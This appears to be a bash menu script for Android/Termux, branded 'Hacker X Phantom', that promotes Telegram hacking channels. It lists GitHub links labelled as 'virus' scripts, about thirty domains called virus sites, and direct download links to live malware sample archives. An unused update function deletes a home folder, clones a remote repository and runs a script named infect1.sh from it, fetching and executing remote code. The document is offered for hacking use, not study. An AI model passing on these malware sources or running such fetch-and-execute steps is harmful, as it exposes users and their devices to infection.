# A tool by Hacker X Phantom 
# if u copy Give Me Credit
# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
echo -e '\e[91m           
.                         ▄          ▄
                          █▄        ██
                          ███     ▄███
                          ████████████
                          ████████████
                         ▄████████████
                        ▄██▀███████▀███
                        ███░▄██████░▄██▄
                       ▄████████████████
                       █████████████████
                       █████████████████
                    ▄                     ▄▄
                   ███░█████████████████░▄███
                  ████░█████████████████░████ 
                  ████░█████████████████░████
                  ████░█████████████████░████ 
                  ████░█████████████████░████ 
                  ████░█████████████████░████ 
                  ████░█████████████████░████
                  ████░█████████████████░████
                  ████░█████████████████░████ 
                  ████░█████████████████░████
                   ███░█████████████████░▀███
                    ▀  █████████████████  ▀▀
                       █████████████████
                       ▀████████████████
                        ▀▀▀███▀▀▀████▀▀
                           ███   ████
                           ███   ████
                           ███   ████
                           ███   ████
                           ███   ████
                           ▀█▀    ██

'
echo " " 
echo -e "$red ~~> $grn my channel Telegram = @Filtering_Hacking $red<~~$rset"
echo 
# Functions
echo -e "$red ~~>$grn my id Telegram = @tacklorix $red<~~$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[91m               
.                         ▄          ▄
                          █▄        ██
                          ███     ▄███
                          ████████████
                          ████████████
                         ▄████████████
                        ▄██▀███████▀███
                        ███░▄██████░▄██▄
                       ▄████████████████
                       █████████████████
                       █████████████████
                    ▄                     ▄▄
                   ███░█████████████████░▄███
                  ████░█████████████████░████ 
                  ████░█████████████████░████
                  ████░█████████████████░████ 
                  ████░█████████████████░████ 
                  ████░█████████████████░████ 
                  ████░█████████████████░████
                  ████░█████████████████░████
                  ████░█████████████████░████ 
                  ████░█████████████████░████
                   ███░█████████████████░▀███
                    ▀  █████████████████  ▀▀
                       █████████████████
                       ▀████████████████
                        ▀▀▀███▀▀▀████▀▀
                           ███   ████
                           ███   ████
                           ███   ████
                           ███   ████
                           ███   ████
                           ▀█▀    ██
'
echo " "
echo -e "$red ~~>$grn my channel Telegram = @Filtering_Hacking  $red<~~$rset"
echo
# Functions
echo -e "$red ~~>$grn my id Telegram = @tacklorix $red<~~$rset"
echo " "
echo " "
}
menu(){
echo -e "$red <-$ylo Tack Lorix $red ->$rset"
echo " "
echo " "
echo -e "$red />$cyan [\e[94m1\e[96m]\e[96mVirus show"
echo -e "$red />$cyan [\e[94m2\e[96m]\e[95mVirus web & malware"
echo -e "$red />$cyan [\e[94m3\e[96m]\e[96mAbout"
echo -e "$red />$cyan [\e[94m4\e[96m]\e[95mJoin Us"
echo -e "$red />$cyan [\e[94m5\e[96m]\e[96mExit"
echo " "
echo " "
echo -e "$red <-$ylo Tack Lorix $red ->$rset"
echo " "
echo -ne "\e[92m %> chois your number \e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
am start -a android.intent.action.VIEW -d https://bit.ly/3PV3S3r > /dev/null 2>&1
banner
menu
elif [ $optnz = "5" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[94m 
▄█████████▄░░░░░░░░░░░░░░░░░░███░░░░░░░░░░░▄█▄░░░░░░░░░░░░░░░░░░░░░░░▄██
▀▀▀▀███▀▀▀░░░░░░░░░░░░░░░░░░░███░░░░░░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░▀
░░░░███░░░░▄████▄░░░░▄████▄░░███░░▄██░░░░░░███░░░░░░░░▄████▄░░░██▄▄█░▄██░░██░░▄██
░░░░███░░░░▀▀░░███░░██▀░▀▀██░███▄██▀░░░░░░░███░░░░░░░██▀░░▀██░░███▀▀░███░░▀██▄██▀
░░░░███░░░░▄▄▄▄███░░██░░░░░░░█████▄░░░░░░░░███░░░░░░░██░░░░██░░███░░░███░░░▀███▀
░░░░███░░░███░░███░░██░░░░▄░░███▀██▄░░░░░░░███░░░░░░░██░░░░██░░███░░░███░░░█████
░░░░███░░░███▄▄███░░▀██▄▄██▀░███░░██▄░░░░░░████▄▄▄▄▄░▀██▄▄██▀░░███░░░███░░██▀░███
░░░░▀▀░░░░░▀▀▀▀▀▀▀░░░░▀▀▀▀░░░▀▀░░░░▀▀░░░░░░▀▀▀▀▀▀▀▀▀░░░▀▀▀▀░░░░▀▀░░░░░▀▀░░▀▀░░░▀▀
'
echo " "
echo -e "\e[91m  links virus show :


         \e[95m Show Virus : \e[92m
         
--->   bash👇

/> https://github.com/Projektiohack/link-virusv2/blob/main/virus.sh

/> https://github.com/WhoAmI-T1T4N/Link-Virus/blob/main/Virus_Link.sh

/> https://github.com/Azka-afk/Link-Virus/blob/main/LinkVirus.sh

/> https://github.com/DBDJKK09/Link-Virus-controlar-PC/blob/main/PC-Virus-Intrucciones

--->   python👇

/> https://github.com/akshshu/Virus-Clustering-using-Complete-Linkage-Hierarchical-Clustering-Technique/blob/master/20CS60R40_VC4.py

/> https://github.com/gunslinger/Python-VirusTotal-link-scanner/blob/master/main.py

--->   txt 👇
/> https://github.com/MrVirusSpm-07/link-virus/blob/main/LiNk1.sh

/> https://hiddenlayer.com/research/crossing-the-rubika-the-use-and-abuse-of-ai-cloud-services/

--->   site 👇

/> https://www.virustotal.com

--->   coded👇

/> https://liveweave.com/JUcnd7
"
echo
echo -ne "\e[92m%> Type 8 fore exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[94m 
▄█████████▄░░░░░░░░░░░░░░░░░░███░░░░░░░░░░░▄█▄░░░░░░░░░░░░░░░░░░░░░░░▄██
▀▀▀▀███▀▀▀░░░░░░░░░░░░░░░░░░░███░░░░░░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░▀
░░░░███░░░░▄████▄░░░░▄████▄░░███░░▄██░░░░░░███░░░░░░░░▄████▄░░░██▄▄█░▄██░░██░░▄██
░░░░███░░░░▀▀░░███░░██▀░▀▀██░███▄██▀░░░░░░░███░░░░░░░██▀░░▀██░░███▀▀░███░░▀██▄██▀
░░░░███░░░░▄▄▄▄███░░██░░░░░░░█████▄░░░░░░░░███░░░░░░░██░░░░██░░███░░░███░░░▀███▀
░░░░███░░░███░░███░░██░░░░▄░░███▀██▄░░░░░░░███░░░░░░░██░░░░██░░███░░░███░░░█████
░░░░███░░░███▄▄███░░▀██▄▄██▀░███░░██▄░░░░░░████▄▄▄▄▄░▀██▄▄██▀░░███░░░███░░██▀░███
░░░░▀▀░░░░░▀▀▀▀▀▀▀░░░░▀▀▀▀░░░▀▀░░░░▀▀░░░░░░▀▀▀▀▀▀▀▀▀░░░▀▀▀▀░░░░▀▀░░░░░▀▀░░▀▀░░░▀▀
'
echo " "
echo " "
echo -e "\e[91m  Links web virusy & links download malware :

           \e[95m Web Virusy : \e[92m
           
        
/>  17ebook.co
/>  aladel.net
/>  bpwhamburgorchardpark.org
/>  clicnews.com
/>  dfwdiesel.net
/>  divineenterprises.net
/>  fantasticfilms.ru
/>  gardensrestaurantandcatering.com
/>  ginedis.com
/>  gncr.org
/>  hdvideoforums.org
/>  hihanin.com
/>  kingfamilyphotoalbum.com
/>  likaraoke.com
/>  mactep.org
/>  magic4you.nu
/>  marbling.pe.kr
/>  nacjalneg.info
/>  pronline.ru
/>  purplehoodie.com
/>  qsng.cn
/>  seksburada.net
/>  sportsmansclub.net
/>  stock888.cn
/>  tathli.com
/>  teamclouds.com
/>  texaswhitetailfever.com
/>  wadefamilytree.org
/>  xnescat.info   

\e[95m download malware :  \e[92m


/> http://www.tekdefense.com/downloads/malware-samples/newbos2.exe.zip

/> http://www.tekdefense.com/downloads/malware-samples/tekdefense.zip

/> http://www.tekdefense.com/downloads/malware-samples/KUNKRNMALWARESAMPLE.rar

/> http://www.tekdefense.com/downloads/malware-samples/MALZ6.zip

/> http://www.tekdefense.com/downloads/malware-samples/TekDefense.7z

/> http://www.tekdefense.com/downloads/malware-samples/1.exe.zip

/> http://www.tekdefense.com/downloads/malware-samples/0.exe.zip


                  \e[96m Tack Lorix

"
echo
echo -ne "\e[92m%> Type 8 fore exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
   ||  ||  
    \\()// 
  //(__)\\
  ||    ||
'
echo -e "\e[93m                  CALL ME \e[92mXPHANTOM" | pv -qL 10
echo -e "\e[93m             ADMIN OF \e[92mHACKER X PHANTOM" | pv -qL 10
echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
echo -e "\e[93m         Keep Supporting And Join Us " | pv -qL 10
echo -e "\e[93m         Join Us:\e[92m https://bit.ly/3PV3S3r\e[0m" | pv -qL 10
echo -e "\e[92m                BYEE.............." | pv -qL 10
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/test" ];
then
cd $HOME
rm -rf test
elif [ -d "$HOME/test" ];
then
cd $HOME
rm -rf test
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/tacklorixam/test 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd test
bash infect1.sh
}
banner
menu
